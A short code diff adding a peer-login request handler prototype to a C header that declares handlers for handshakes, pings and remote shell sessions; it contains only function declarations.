@@ -53,6 +53,7 @@ void laikaC_closeShell(struct sLaika_shellInfo *shell);
 void laikaC_closeShells(struct sLaika_peer *peer);
 
 void laikaC_handleHandshakeRequest(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData);
+void laikaC_handlePeerLoginReq(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz, void *uData);
 void laikaC_handlePing(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData);
 void laikaC_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData);
 void laikaC_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData);
